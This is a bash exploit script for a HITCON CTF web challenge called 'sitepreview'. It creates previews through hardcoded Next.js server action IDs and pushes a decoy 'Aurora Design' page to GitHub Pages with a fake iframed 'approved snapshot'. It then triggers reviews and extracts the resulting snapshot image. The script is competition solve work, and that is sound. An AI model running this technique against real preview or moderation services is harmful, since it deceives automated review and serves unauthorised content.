#!/bin/bash
set -o pipefail
BASE_EXT="https://sitepreview.chal.hitconctf.com"
get_port() { curl -s -b cookies.txt --max-time 30 "$BASE_EXT/" | grep -oE 'http://sitepreview\.chal\.hitconctf\.com:[0-9]+' | head -1; }
PORT=$(get_port)
if [ -z "$PORT" ]; then
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port)
fi
echo "INSTANCE=$PORT"
probe=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$PORT/" || true)
if [ "$probe" != "200" ]; then
  echo "recreating instance (probe=$probe)"
  curl -s -b cookies.txt -X POST "$BASE_EXT/stop" -o /dev/null
  sleep 3
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port); echo "INSTANCE2=$PORT"
fi
for i in $(seq 1 45); do code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "$PORT/" || true); [ "$code" = "200" ] && break; sleep 2; done
[ "$code" = "200" ] || { echo "NOT READY"; exit 1; }

CREATE_ID="40826ee1e38d462252e0a1f6761f0741fca9607bbe"
REVIEW_ID="400cce7790f1e3554d5a9d0db54d9870b9ca678be9"
mkprev() {
  ENC=$(python3 -c "import json,sys;print(json.dumps([sys.argv[1]]))" "$1")
  R=$(curl -s --max-time 60 -X POST "$PORT/" -H "Next-Action: $CREATE_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "$ENC")
  echo "$R" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1
}
PID_A=$(mkprev "https://marlobbz.github.io/sitepreview-test/")
echo "PID_A=$PID_A"
[ -z "$PID_A" ] && exit 1

# build embed page for B and push
mkdir -p embed
python3 - <<PYEOF
pid_b = "PLACEHOLDER"
ext = f"https://marlobbz.github.io/sitepreview-test/render-page/{pid_b}/"
html = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Aurora Design — Creative Studio</title>
<style>body{{font-family:system-ui,sans-serif;margin:0;color:#1a202c}}
header{{background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center}}
main{{max-width:960px;margin:40px auto;padding:0 20px}}
.widget{{border:1px solid #e2e8f0;border-radius:12px;overflow:hidden}}
iframe{{border:0;width:100%;height:480px}}
footer{{background:#2d3748;color:#a0aec0;text-align:center;padding:24px;margin-top:40px}}</style></head>
<body>
<header><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header>
<main><section><h2>Live preview widget</h2>
<div class="widget"><iframe src="{ext}" title="Website snapshot" width="100%" height="480"></iframe></div>
</section></main>
<footer>© 2026 Aurora Design Studio</footer></body></html>"""
open("embed/index.html","w").write(html)
PYEOF

PID_B=$(mkprev "https://marlobbz.github.io/sitepreview-test/embed/")
echo "PID_B=$PID_B"
[ -z "$PID_B" ] && exit 1
sed -i "s/PLACEHOLDER/$PID_B/" embed/index.html

# inner fake render page for the fakefast iframe
mkdir -p render-page/$PID_B
cat > render-page/$PID_B/index.html <<EOF2
<!doctype html>
<html><head><meta charset="utf-8"><title>Website snapshot</title></head>
<body><div><span>Website snapshot</span><h1>aurora</h1></div>
<img alt="Approved snapshot" width="640" height="480">
<footer><span>SitePreview</span></footer></body></html>
EOF2
git add -A && git -c user.email=bot@users.noreply.github.com -c user.name="Actions bot" commit -qm "duo $PID_A $PID_B" && git push -q origin main || { echo PUSH_FAILED; exit 1; }
echo PUSHED
for i in $(seq 1 24); do
  C=$(curl -s --max-time 15 "https://marlobbz.github.io/sitepreview-test/embed/" | grep -c "$PID_B" || true)
  [ "$C" -ge 1 ] && { echo "PAGE_LIVE ${i}0s"; break; }
  sleep 10
done

reqrev() {
  PAGE=$(curl -s --max-time 30 "$PORT/preview/$1")
  BLOB=$(echo "$PAGE" | python3 -c "
import sys,re
h=sys.stdin.read()
m=re.search(r'1c:.\\\\\"([A-Za-z0-9+/=]{50,})\\\\\"', h) or re.search(r'1c:\"([A-Za-z0-9+/=]{50,})\"', h) or re.search(r'1c:.\"([A-Za-z0-9+/=]{50,})', h)
print(m.group(1) if m else 'NOBLOB')")
  [ "$BLOB" = "NOBLOB" ] && { echo "NOBLOB-$1"; return 1; }
  RR=$(curl -s --max-time 90 -X POST "$PORT/preview/$1" -H "Next-Action: $REVIEW_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "[$BLOB]")
  if echo "$RR" | grep -q '"E{'; then echo "REVIEW_ERROR-$1"; else echo "REVIEW_OK-$1"; fi
}
reqrev "$PID_A"
reqrev "$PID_B"

T0=$(date +%s); DA=""; DB=""
while true; do
  NOW=$(date +%s); EL=$((NOW-T0))
  if [ -z "$DA" ]; then DA=$(curl -s --max-time 15 "$PORT/render/$PID_A" | grep -oE '(Approved|Rejected)' | head -1 || true); [ -n "$DA" ] && echo "A_DECISION=$DA AT=+${EL}s"; fi
  if [ -z "$DB" ]; then DB=$(curl -s --max-time 15 "$PORT/render/$PID_B" | grep -oE '(Approved|Rejected)' | head -1 || true); [ -n "$DB" ] && echo "B_DECISION=$DB AT=+${EL}s"; fi
  { [ -n "$DA" ] && [ -n "$DB" ]; } && break
  [ $EL -gt 360 ] && { echo "TIMEOUT A=$DA B=$DB"; break; }
  sleep 3
done
echo "PID_A=$PID_A PID_B=$PID_B"

if [ "$DB" = "Approved" ]; then
  curl -s --max-time 30 "$PORT/render/$PID_B" -o render_page.html
  python3 - <<PYEOF
import re, base64
h = open("render_page.html").read()
m = re.search(r'dataUrl":"(data:image/[^"]+)', h) or re.search(r'dataUrl\\":\\"(data:image/[^\\]+)', h)
if m:
    du = m.group(1)
    open("snapshot_dataurl.txt","w").write(du)
    open("snapshot.png","wb").write(base64.b64decode(du.split(",",1)[1]))
    print("SNAPSHOT_SAVED")
else:
    print("NO_DATAURL")
PYEOF
fi
